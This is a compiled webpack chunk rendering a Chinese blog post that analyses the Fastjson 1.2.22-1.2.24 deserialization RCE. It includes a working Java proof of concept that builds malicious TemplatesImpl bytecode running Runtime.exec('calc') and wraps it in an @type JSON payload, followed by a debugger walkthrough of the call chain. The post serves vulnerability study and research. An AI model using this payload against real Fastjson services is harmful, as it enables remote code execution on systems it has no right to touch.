(window.webpackJsonp=window.webpackJsonp||[]).push([[20],{498:function(s,a,t){"use strict";t.r(a);var n=t(32),e=Object(n.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"前言"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#前言"}},[s._v("#")]),s._v(" 前言")]),s._v(" "),t("p",[s._v("在Fastjson版本为1.2.22-1.2.24的时候存在反序列化漏洞，这个漏洞可以基于两种利用方式：")]),s._v(" "),t("ul",[t("li",[s._v("基于TemplatesImpl的恶意字节码")]),s._v(" "),t("li",[s._v("基于JdbcRowSetImpl的JNDI")])]),s._v(" "),t("p",[s._v("下面笔者会就这两种利用方式来对这个漏洞进行调试分析。")]),s._v(" "),t("h2",{attrs:{id:"基于templatesimpl"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#基于templatesimpl"}},[s._v("#")]),s._v(" 基于TemplatesImpl")]),s._v(" "),t("h3",{attrs:{id:"环境配置"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境配置"}},[s._v("#")]),s._v(" 环境配置")]),s._v(" "),t("div",{staticClass:"custom-block note"},[t("p",{staticClass:"custom-block-title"},[s._v("环境")]),s._v(" "),t("ul",[t("li",[s._v("Fastjson 1.2.22-1.2.24（笔者使用的是1.2.24）")]),s._v(" "),t("li",[s._v("JDK 8u101")])])]),s._v(" "),t("div",{staticClass:"custom-block tip"},[t("p",{staticClass:"custom-block-title"},[s._v("POC用的额外的jar包")]),s._v(" "),t("ul",[t("li",[s._v("commons-codec-1.9（用于对class文件进行base64编码）")]),s._v(" "),t("li",[s._v("javassist（用于生成恶意字节码文件）")])])]),s._v(" "),t("h3",{attrs:{id:"poc-1"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#poc-1"}},[s._v("#")]),s._v(" POC(1)")]),s._v(" "),t("p",[s._v("笔者这里先把poc放下面，之后再进行调试分析：")]),s._v(" "),t("div",{staticClass:"language-java line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-java"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("class")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Demo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("static")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("main")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" args"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("throws")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Exception")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n        利用javassist来生成恶意字节码\n         */")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 获取类池对象")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ClassPool")]),s._v(" aDefault "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ClassPool")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("getDefault")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 向类池中添加类")]),s._v("\n        aDefault"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("insertClassPath")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ClassClassPath")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("AbstractTranslet")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("class")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("CtClass")]),s._v(" calc "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" aDefault"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("makeClass")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Calc"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),s._v(" cmd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"java.lang.Runtime.getRuntime().exec(\\"calc\\");"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 生成恶意static代码块")]),s._v("\n        calc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("makeClassInitializer")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("insertBefore")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cmd"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        calc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("setSuperclass")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("aDefault"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("get")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("AbstractTranslet")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("class")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("getName")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 获取字节数组")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("byte")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" bytes "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" calc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("toBytecode")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 获取恶意字节码")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),s._v(" base64ClassString "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Tools")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("getBase64String")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bytes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 生成payload")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),s._v(" payload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"{'@type':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl','_bytecodes':['\"")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" base64ClassString "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"'],'_name':'f4de','_tfactory':{},'_outputProperties':{}}\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        payload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Tools")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("processString")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("System")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("out"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("println")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 进行反序列化")]),s._v("\n        JSON"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("parseObject")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Feature")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("SupportNonPublicField")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br")])]),t("p",[s._v("为了方便写POC，笔者额外写了一个"),t("code",[s._v("Tools")]),s._v("类来对payload进行处理：")]),s._v(" "),t("div",{staticClass:"language-java line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-java"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("class")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Tools")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n    处理json字符串，用\"来替换'\n     */")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("static")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("processString")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),s._v(" string"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        string "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" string"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("replace")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\'"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\""')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" string"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n    根据class文件的路径生成base64字符串\n     */")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("static")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("getBase64String")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),s._v(" classPath"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("throws")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Exception")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ByteArrayOutputStream")]),s._v(" byteArrayOutputStream "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ByteArrayOutputStream")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("try")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("IOUtils")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("copy")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("FileInputStream")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("File")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("classPath"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" byteArrayOutputStream"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("catch")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Exception")]),s._v(" e"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            e"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("printStackTrace")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Base64")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("encodeBase64String")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("byteArrayOutputStream"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("toByteArray")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n    根据字节数组直接生成base64字符串\n    建议搭配javassist来使用\n     */")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("static")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("String")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("getBase64String")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("byte")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" bytes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("throws")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Exception")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Base64")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("encodeBase64String")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bytes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br")])]),t("p",[s._v("运行POC：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/01/o6vlbcxQXwkpEZV.png",alt:"image-20201201112355907"}})]),s._v(" "),t("h3",{attrs:{id:"poc-1-分析"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#poc-1-分析"}},[s._v("#")]),s._v(" POC(1)分析")]),s._v(" "),t("h4",{attrs:{id:"限制条件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#限制条件"}},[s._v("#")]),s._v(" 限制条件")]),s._v(" "),t("ul",[t("li",[s._v("必须开启"),t("code",[s._v("Feature.SupportNonPublicField")]),s._v("才能RCE成功")])]),s._v(" "),t("h4",{attrs:{id:"前置知识"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#前置知识"}},[s._v("#")]),s._v(" 前置知识")]),s._v(" "),t("p",[s._v("如果调试过CC链的朋友应该都知道CC2就是基于恶意字节码来进行利用的，利用点在于"),t("code",[s._v("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")]),s._v("这个类。在这里也是利用了同样的方式，如果不熟悉也没关系，我们下面对这个类进行简单的分析：")]),s._v(" "),t("p",[s._v("这个类中的成员变量大多是被"),t("code",[s._v("private")]),s._v("所修饰，其中漏洞的利用点在"),t("code",[s._v("_bytecodes")]),s._v("和"),t("code",[s._v("_outputProperties")]),s._v("这两个成员变量。")]),s._v(" "),t("p",[s._v("先看"),t("code",[s._v("_outputProperties")]),s._v("的构造方法"),t("code",[s._v("getOutputProperties()")]),s._v("：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/01/pklSj5KJ4wIBEv7.png",alt:"image-20201201114210585"}})]),s._v(" "),t("p",[s._v("这里调用了"),t("code",[s._v("newTransformer()")]),s._v("这个方法，继续跟进：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/01/1QEmt7grl4eTAVK.png",alt:"image-20201201115122002"}})]),s._v(" "),t("p",[s._v("接着调用了"),t("code",[s._v("getTransletInstance()")]),s._v("，继续跟进：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/01/aZFEKO9R5HYqnMD.png",alt:"image-20201201191844480"}})]),s._v(" "),t("p",[s._v("再跟进"),t("code",[s._v("defineTransletClasses()")]),s._v(":")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/01/p65Gm1gCRJzBN9w.png",alt:"image-20201201192042667"}})]),s._v(" "),t("p",[s._v("在这个方法中会对"),t("code",[s._v("_bytecodes[]")]),s._v("这个字节数组进行"),t("code",[s._v("defineClass")]),s._v("处理，作用就是把字节码文件还原成一个类，并把结果赋值给"),t("code",[s._v("_class[i]")]),s._v("。但是在还原的过程中不会调用这个类的构造函数和"),t("code",[s._v("static")]),s._v("静态代码块，只有显式的调用其构造函数，构造方法和类初始化代码块才会被执行，所以我们再回到"),t("code",[s._v("getTransletInstance()")]),s._v("方法：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/01/o2IHunrlktGDpEi.png",alt:"image-20201201193040393"}})]),s._v(" "),t("p",[s._v("在这里调用了"),t("code",[s._v("_class[]")]),s._v("数组中的类中的构造方法和类的初始化代码块。")]),s._v(" "),t("p",[s._v("由于篇幅所限，又涉及到了Java字节码的知识，这里就只能对它进行简单的分析，如果有机会以后会写一篇文章来详细说一下Java字节码。")]),s._v(" "),t("h4",{attrs:{id:"分析"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#分析"}},[s._v("#")]),s._v(" 分析")]),s._v(" "),t("p",[s._v("直接在最后一行的"),t("code",[s._v("JSON.parseObject")]),s._v("打下断点，先跟进到"),t("code",[s._v("JSON.parse")]),s._v("方法，此时的函数调用栈如下：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("parse:136, JSON (com.alibaba.fastjson)\nparse:193, JSON (com.alibaba.fastjson)\nparseObject:197, JSON (com.alibaba.fastjson)\nmain:34, Demo (com.demo2)\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[t("img",{attrs:{src:"https://i.loli.net/2020/12/04/X7gauLkTonO1dh8.png",alt:"image-20201204165337062"}})]),s._v(" 